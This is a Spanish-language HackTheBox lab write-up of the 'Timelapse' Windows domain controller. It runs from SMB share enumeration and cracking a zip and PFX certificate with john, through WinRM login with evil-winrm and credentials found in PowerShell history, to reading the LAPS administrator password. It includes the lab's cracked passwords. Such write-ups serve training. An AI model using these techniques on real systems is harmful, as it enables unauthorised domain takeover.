Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #laps #certificate #certificate-cracking #ad #password-cracking #smb #openssl

![](assets/Pasted%20image%2020260108234946.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~]
└─$ ping -c 1 10.129.227.113
PING 10.129.227.113 (10.129.227.113) 56(84) bytes of data.
64 bytes from 10.129.227.113: icmp_seq=1 ttl=127 time=1700 ms

--- 10.129.227.113 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1699.947/1699.947/1699.947/0.000 ms
```

Ahora tiro un escaneo para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.227.113 -oG nmap/allPorts

PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 127
88/tcp    open  kerberos-sec   syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
389/tcp   open  ldap           syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
464/tcp   open  kpasswd5       syn-ack ttl 127
593/tcp   open  http-rpc-epmap syn-ack ttl 127
636/tcp   open  ldapssl        syn-ack ttl 127
5986/tcp  open  wsmans         syn-ack ttl 127
49673/tcp open  unknown        syn-ack ttl 127
49674/tcp open  unknown        syn-ack ttl 127
49695/tcp open  unknown        syn-ack ttl 127
57327/tcp open  unknown        syn-ack ttl 127
```

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar versiones, servicios y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse]
└─$ sudo nmap -p 53,88,135,139,389,445,464,593,636,5986,49673,49674,49695,57327 -sV -sC -Pn -n -vvv -sS 10.129.227.113 -oN nmap/target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-09 13:59:56Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?      syn-ack ttl 127
5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2026-01-09T14:01:28+00:00; +7h59m56s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233:a199:4504:0859:013f:b9c5:e4f6:91c3
| SHA-1: 5861:acf7:76b8:703f:d01e:e25d:fc7c:9952:a447:7652
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQLRY/feXALoZCPZtUeyiC4DANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwHhcNMjExMDI1MTQwNTI5WhcN
| MjIxMDI1MTQyNTI5WjAdMRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJdoIQMYt47skzf17SI7M8jubO
| rD6sHg8yZw0YXKumOd5zofcSBPHfC1d/jtcHjGSsc5dQQ66qnlwdlOvifNW/KcaX
| LqNmzjhwL49UGUw0MAMPAyi1hcYP6LG0dkU84zNuoNMprMpzya3+aU1u7YpQ6Dui
| AzNKPa+6zJzPSMkg/TlUuSN4LjnSgIV6xKBc1qhVYDEyTUsHZUgkIYtN0+zvwpU5
| isiwyp9M4RYZbxe0xecW39hfTvec++94VYkH4uO+ITtpmZ5OVvWOCpqagznTSXTg
| FFuSYQTSjqYDwxPXHTK+/GAlq3uUWQYGdNeVMEZt+8EIEmyL4i4ToPkqjPF1AgMB
| AAGjRjBEMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAdBgNV
| HQ4EFgQUZ6PTTN1pEmDFD6YXfQ1tfTnXde0wDQYJKoZIhvcNAQELBQADggEBAL2Y
| /57FBUBLqUKZKp+P0vtbUAD0+J7bg4m/1tAHcN6Cf89KwRSkRLdq++RWaQk9CKIU
| 4g3M3stTWCnMf1CgXax+WeuTpzGmITLeVA6L8I2FaIgNdFVQGIG1nAn1UpYueR/H
| NTIVjMPA93XR1JLsW601WV6eUI/q7t6e52sAADECjsnG1p37NjNbmTwHabrUVjBK
| 6Luol+v2QtqP6nY4DRH+XSk6xDaxjfwd5qN7DvSpdoz09+2ffrFuQkxxs6Pp8bQE
| 5GJ+aSfE+xua2vpYyyGxO0Or1J2YA1CXMijise2tp+m9JBQ1wJ2suUS2wGv1Tvyh
| lrrndm32+d0YeP/wb8E=
|_-----END CERTIFICATE-----
|_http-title: Not Found
| tls-alpn:
|_  http/1.1
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57327/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 38738/tcp): CLEAN (Timeout)
|   Check 2 (port 59031/tcp): CLEAN (Timeout)
|   Check 3 (port 43455/udp): CLEAN (Timeout)
|   Check 4 (port 50405/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2026-01-09T14:00:48
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m55s, deviation: 0s, median: 7h59m55s
```

Por la informacion que tenemos podemos intuir que estamos contra un `DC`.

- Puerto 88 Kerberos
- Puerto 135 RPC
- Puerto 139, 445 SMB
- Puerto 389, 646 LDAP
- Puerto 5985 WinRm

## Enumeración

### Puerto 139, 445 SMB

Saque informacion general de la maquina:

- dominio **timelapse.htb**
- nombre de la maquina **DC01**

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse]
└─$ nxc smb 10.129.227.113
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
```

Metí eso al /etc/hosts

```bash
10.129.227.113 timelapse.htb DC01.timelapse.htb DC01
```

Ahora voy a enumerar los shares a los que tengo acceso usando una Null session.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse]
└─$ nxc smb 10.129.227.113 -u 'guest' -p '' --shares
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\guest:
SMB         10.129.227.113  445    DC01             [*] Enumerated shares
SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
SMB         10.129.227.113  445    DC01             -----           -----------     ------
SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.227.113  445    DC01             C$                              Default share
SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share
SMB         10.129.227.113  445    DC01             Shares          READ
SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share
```

- Tengo acceso al recurso **Shares**

Con `smbclient` me voy a conectar al recurso **Shares**.

- El recurso tenia 2 directorios uno de ellos era **Dev** que contenía un zip llamado **winrm_backup.zip** el cual me descargue.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/loot]
└─$ smbclient //10.129.227.113/Shares -N

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 15:39:15 2021
  ..                                  D        0  Mon Oct 25 15:39:15 2021
  Dev                                 D        0  Mon Oct 25 19:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 15:48:42 2021

                6367231 blocks of size 4096. 1254250 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 19:40:06 2021
  ..                                  D        0  Mon Oct 25 19:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 15:46:42 2021

                6367231 blocks of size 4096. 1253277 blocks available
smb: \Dev\> get winrm_backup.zip
```

- El otro directorio HelpDesk contenía bastantes archivos **.docx**.

```bash
smb: \> cd HelpDesk
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 15:48:42 2021
  ..                                  D        0  Mon Oct 25 15:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 14:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 14:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 14:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 14:57:44 2021

                6367231 blocks of size 4096. 1246439 blocks available
smb: \HelpDesk\> mget *
```

## Intrusion.

El contenido del zip al parecer es un certificado **.pfx**.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/content]
└─$ 7z l winrm_backup.zip

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-25 14:21:20 .....         2555         2405  legacyy_dev_auth.pfx
------------------- ----- ------------ ------------  ------------------------
```

Al intentar descomprimir el zip me pidió contraseña por lo cual voy a crackearla con `john` y `zip2jhon` 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/content]
└─$ zip2john winrm_backup.zip > cert.hash

┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/content]
└─$ john cert.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)

1g 0:00:00:00 DONE (2026-01-09 06:07) 2.564g/s 8906Kp/s 8906Kc/s 8906KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- supremelegacy es la contraseña del zip.

Descomprimí el zip y obtuve el certificado con nombre **legacyy_dev_auth.pfx** que al tratar de inspeccionarlo con `openssl` me volvió a pedir contraseña.

- Voy a crackear la contraseña del certificado con `pfx2john` y `john`

```bash
──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/loot]
└─$ pfx2john legacyy_dev_auth.pfx > pfx.hash

┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/loot]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

thuglegacy       (legacyy_dev_auth.pfx)

1g 0:00:00:35 DONE (2026-01-09 06:16) 0.02855g/s 92282p/s 92282c/s 92282C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- thuglegacy es la password del certificado

Ahora puedo inspeccionar el certificado con `openssl`.

- El certificado le pertenece al usuario Legacyy 
- **Extended Key Usage: TLS Web Client Authentication**, indica que este certificado lo podemos utilizar para autenticarnos en servicios como WinRm.
- El certificado es valida hasta Oct 25 14:15:52 2031

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/loot]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -clcerts | openssl x509 -noout -text

Enter Import Password:
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            1d:99:89:29:8a:cf:11:bb:41:93:a1:cf:f4:4e:12:df
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=Legacyy
        Validity
            Not Before: Oct 25 14:05:52 2021 GMT
            Not After : Oct 25 14:15:52 2031 GMT
        Subject: CN=Legacyy
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:a5:56:07:a3:62:16:47:1e:e2:f3:4d:23:ad:61:
                    71:ce:8b:9e:b3:4a:87:2b:f6:89:bc:e7:86:03:bb:
                    <MAS..>
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            X509v3 Extended Key Usage:
                TLS Web Client Authentication
            X509v3 Subject Alternative Name:
                othername: UPN:legacyy@timelapse.htb
            X509v3 Subject Key Identifier:
                CC:D9:0E:E4:AF:20:9E:B0:75:2B:FD:81:96:1E:AC:2D:B1:25:58:19
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        5f:8e:fb:76:bf:de:3e:fe:96:fd:da:72:c8:4b:8a:e7:6b:b0:
        88:2a:ba:9a:9b:de:ba:1f:c9:05:ea:de:e9:1d:93:e5:10:36:
        4c:af:5e:ee:e7:49:2f:4c:dd:43:e0:fb:65:0a:e7:7d:49:a3:
        e<MAS..>
```

Podemos extraer las claves para conectarnos via WinRM.

- Primero extraigo la clave privada.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/loot]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key -nodes -passin pass:thuglegacy
```

- Ahora extraigo el certificado publico.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/loot]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacyy.crt -passin pass:thuglegacy
```

Y me conecto via WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/loot]
└─$ evil-winrm -i 10.129.227.113 -c legacyy.crt -k legacyy.key -S

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

## Escalada de Privilegios

Dentro del sistema puedo ver a que grupos pertenece mi usuario.

- Nada raro y en tema de privilegios tampoco tengo nada raro.

```bash
*Evil-WinRM* PS C:\> net user legacyy
User name                    legacyy
Full Name                    Legacyy
Comment
User's' comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 11:17:10 AM
Password expires             Never
Password changeable          10/24/2021 11:17:10 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/9/2026 6:35:13 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
```

Otra cosa que puedo hacer es checar el historial de powershell, que se suele encontrarse en AppData.

```bash
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt

whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

- Vemos las credenciales de svc_deploy / E3R$Q62^12p7PLlC%KWaxuaV

Ahora puedo conectarme via winrm con estas credenciales.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/loot]
└─$ evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

En tema de privilegios no tengo nada raro, por lo cual puedo enumerar los grupos a los que pertenezco:

- Pertenezco a TIMELAPSE\LAPS_Readers. 

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
```

!!! info
    **LAPS** = **Local Administrator Password Solution** (de Microsoft).
    LAPS es un mecanismo que rota y guarda automáticamente la contraseña del administrador local de cada equipo en Active Directory.

Al ser parte de este grupo puedo leer la password indicándole la propiedad `ms-Mcs-AdmPwd` (Microsoft Client – Administrator Password).

```bash
*Evil-WinRM* PS C:\Users\> Get-ADComputer DC01 -Properties ms-Mcs-AdmPwd

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-Mcs-AdmPwd     : l1X)0tF58DP7L+}O-D8z(b!D
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

Con la password puedo autenticarme via winrm y thats it.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/timelapse/loot]
└─$ evil-winrm -i timelapse.htb -u administrator -p 'l1X)0tF58DP7L+}O-D8z(b!D' -S

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

La flag se encontraba en el usuario TRX.

```bash
*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
4ea2bdb2a77412*****
```

***PWNED***

![](assets/Pasted%20image%2020260109011518.png)
